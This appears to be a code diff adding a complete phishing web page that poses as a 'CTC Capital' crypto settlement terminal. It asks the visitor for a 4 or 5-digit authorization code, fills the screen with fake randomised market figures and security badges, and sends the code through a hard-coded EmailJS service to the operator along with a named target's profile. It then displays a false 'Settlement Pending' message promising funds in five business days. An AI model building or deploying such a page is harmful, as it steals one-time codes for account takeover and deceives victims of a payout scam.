@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTC Capital | Secured Validation Terminal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { 
+            background: #020617; 
+            color: white; 
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+            overflow-x: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .glass { 
+            background: rgba(255, 255, 255, 0.02); 
+            backdrop-filter: blur(25px); 
+            border: 1px solid rgba(255, 255, 255, 0.08); 
+        }
+        .hidden { display: none; }
+        .success-glow { box-shadow: 0 0 50px rgba(16, 185, 129, 0.15); }
+        
+        @keyframes scan {
+            0% { transform: translateY(-100%); opacity: 0; }
+            50% { opacity: 0.5; }
+            100% { transform: translateY(100%); opacity: 0; }
+        }
+        .scanner-line {
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #3b82f6, #60a5fa, transparent);
+            animation: scan 4s linear infinite;
+        }
+
+        .otp-input:focus {
+            box-shadow: 0 0 15px rgba(59, 130, 246, 0.3);
+            transform: translateY(-2px);
+        }
+
+        /* Market Graph Simulation */
+        .chart-bar {
+            width: 4px;
+            background: #10b981;
+            margin: 0 1px;
+            border-radius: 2px;
+            transition: height 0.3s ease;
+        }
+    </style>
+</head>
+<body class="p-6">
+
+    <div id="validation-box" class="w-full max-w-lg glass rounded-[2.5rem] p-10 relative overflow-hidden shadow-2xl">
+        <div class="scanner-line absolute w-full top-0 left-0"></div>
+        
+        <div class="text-center mb-10">
+            <div class="inline-flex items-center justify-center p-4 rounded-3xl bg-blue-500/10 border border-blue-500/20 mb-6">
+                <svg class="w-10 h-10 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                </svg>
+            </div>
+            <h2 class="text-3xl font-black tracking-tight text-white mb-2">Secure Handshake</h2>
+            <p class="text-slate-400 text-sm">Verification required for high-volume settlements. Enter your <span class="text-blue-400 font-bold">4 or 5-digit</span> authorization code.</p>
+        </div>
+
+        <div class="space-y-10">
+            <div class="flex justify-center gap-3" id="otp-inputs">
+                <input type="text" maxlength="1" class="otp-input w-14 h-18 bg-slate-900/60 border border-slate-700 rounded-2xl text-center text-3xl font-black text-blue-400 outline-none transition-all">
+                <input type="text" maxlength="1" class="otp-input w-14 h-18 bg-slate-900/60 border border-slate-700 rounded-2xl text-center text-3xl font-black text-blue-400 outline-none transition-all">
+                <input type="text" maxlength="1" class="otp-input w-14 h-18 bg-slate-900/60 border border-slate-700 rounded-2xl text-center text-3xl font-black text-blue-400 outline-none transition-all">
+                <input type="text" maxlength="1" class="otp-input w-14 h-18 bg-slate-900/60 border border-slate-700 rounded-2xl text-center text-3xl font-black text-blue-400 outline-none transition-all">
+                <input type="text" maxlength="1" id="fifth-digit" class="otp-input w-14 h-18 bg-slate-900/60 border border-slate-700 rounded-2xl text-center text-3xl font-black text-blue-400 outline-none transition-all">
+            </div>
+
+            <button onclick="submitSecurityCode()" id="submit-btn" class="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-500 hover:to-blue-600 py-6 rounded-2xl font-black tracking-[0.2em] text-xs shadow-2xl transition-all transform active:scale-95 flex items-center justify-center gap-3">
+                <span id="btn-text">INITIALIZE SETTLEMENT</span>
+                <svg id="loader" class="hidden w-5 h-5 animate-spin text-white" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+            </button>
+        </div>
+
+        <div class="mt-12 pt-8 border-t border-white/5">
+            <div class="flex justify-between items-end mb-6">
+                <div>
+                    <span class="text-[10px] font-black text-slate-500 uppercase tracking-widest block mb-1">Live Market Index</span>
+                    <div class="flex items-baseline gap-2">
+                        <span id="live-price" class="text-xl font-black text-emerald-400">$97,482.10</span>
+                        <span id="price-change" class="text-[10px] font-bold text-emerald-500">+2.4%</span>
+                    </div>
+                </div>
+                <div class="flex items-end h-8" id="market-graph">
+                    </div>
+            </div>
+            
+            <div class="grid grid-cols-2 gap-4">
+                <div class="bg-slate-950/50 p-4 rounded-2xl border border-white/5">
+                    <p class="text-[9px] text-slate-500 font-bold uppercase mb-1">Global Load</p>
+                    <div class="flex items-center gap-2">
+                        <div class="flex-1 bg-slate-800 h-1 rounded-full overflow-hidden">
+                            <div id="load-bar" class="bg-blue-500 h-full transition-all duration-1000" style="width: 88%"></div>
+                        </div>
+                        <span id="stat-load" class="text-[10px] font-black text-blue-400">88%</span>
+                    </div>
+                </div>
+                <div class="bg-slate-950/50 p-4 rounded-2xl border border-white/5">
+                    <p class="text-[9px] text-slate-500 font-bold uppercase mb-1">Security Node</p>
+                    <p class="text-[10px] font-black text-emerald-400 flex items-center gap-1">
+                        <span class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></span>
+                        ENCRYPTED (AES-256)
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="success-screen" class="hidden w-full max-w-lg text-center animate-in fade-in zoom-in duration-1000">
+        <div class="glass p-12 rounded-[3.5rem] success-glow border-emerald-500/30">
+            <div class="w-24 h-24 bg-emerald-500/10 rounded-full flex items-center justify-center mx-auto mb-8 border border-emerald-500/20">
+                <svg class="w-12 h-12 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/>
+                </svg>
+            </div>
+            <h3 class="text-3xl font-black text-white mb-6 uppercase tracking-tight">Security Review Complete</h3>
+            <div class="space-y-4 text-slate-400 text-sm leading-relaxed mb-10 text-center">
+                <p>We have successfully reviewed your account parameters. Due to a high volume of recent synchronization attempts, your payout has been moved to our <span class="text-white font-bold">Priority Manual Audit Queue</span>.</p>
+                <p class="bg-slate-900/50 p-4 rounded-2xl border border-white/5 italic">
+                    "Authorization confirmed. Settlement is being processed via the blockchain gateway."
+                </p>
+                <p>Your funds will be confirmed and reflected in your wallet within <span class="text-emerald-400 font-black">5 business days</span>.</p>
+            </div>
+            <div class="py-4 px-8 bg-emerald-500/10 rounded-2xl border border-emerald-500/20 inline-block">
+                <span class="text-[11px] font-black text-emerald-400 uppercase tracking-[0.3em]">Status: Settlement Pending</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- EMAILJS CONFIGURATION ---
+        (function() {
+            emailjs.init("btmxg3IffyiB-4XHX"); 
+        })();
+
+        // --- OTP LOGIC (Supports 4 or 5 digits) ---
+        const inputs = document.querySelectorAll('.otp-input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('keyup', (e) => {
+                if (e.target.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                if (e.key === 'Backspace' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // --- SIMULATED MARKET ENGINE ---
+        const graphContainer = document.getElementById('market-graph');
+        for(let i=0; i<15; i++) {
+            const bar = document.createElement('div');
+            bar.className = 'chart-bar';
+            bar.style.height = Math.random() * 100 + '%';
+            graphContainer.appendChild(bar);
+        }
+
+        function updateLiveStats() {
+            const price = (97000 + Math.random() * 2000).toLocaleString('en-US', {minimumFractionDigits: 2});
+            document.getElementById('live-price').innerText = `$${price}`;
+            
+            const load = Math.floor(Math.random() * (98 - 85) + 85);
+            document.getElementById('stat-load').innerText = load + "%";
+            document.getElementById('load-bar').style.width = load + "%";
+
+            // Randomize bars
+            document.querySelectorAll('.chart-bar').forEach(bar => {
+                bar.style.height = Math.random() * 100 + '%';
+                bar.style.background = Math.random() > 0.3 ? '#10b981' : '#ef4444';
+            });
+        }
+        setInterval(updateLiveStats, 2500);
+
+        // --- SUBMISSION PROTOCOL ---
+        function submitSecurityCode() {
+            let code = "";
+            inputs.forEach(input => code += input.value);
+
+            // Logic to allow 4 or 5 digits
+            if (code.length < 4) {
+                alert("ACCESS DENIED: Please enter a valid 4 or 5-digit authorization code.");
+                return;
+            }
+
+            const btn = document.getElementById('submit-btn');
+            const loader = document.getElementById('loader');
+            const btnText = document.getElementById('btn-text');
+
+            btn.disabled = true;
+            btnText.innerText = "VERIFYING ENCRYPTION...";
+            loader.classList.remove('hidden');
+
+            const params = {
+                profile_name: "David Maxwells Mmaduabuchi",
+                security_code: code,
+                attempt_status: "Manual Audit Required (Too many attempts)",
+                processing_time: "5 Business Days",
+                timestamp: new Date().toLocaleString()
+            };
+
+            emailjs.send('service_kkj4kyv', 'template_bm1ofua', params)
+            .then(() => {
+                setTimeout(() => {
+                    document.getElementById('validation-box').classList.add('hidden');
+                    document.getElementById('success-screen').classList.remove('hidden');
+                }, 2000);
+            }, (err) => {
+                alert("COMMUNICATION ERROR: Unable to reach validation server.");
+                btn.disabled = false;
+                btnText.innerText = "INITIALIZE SETTLEMENT";
+                loader.classList.add('hidden');
+            });
+        }
+    </script>
+</body>
+</html>
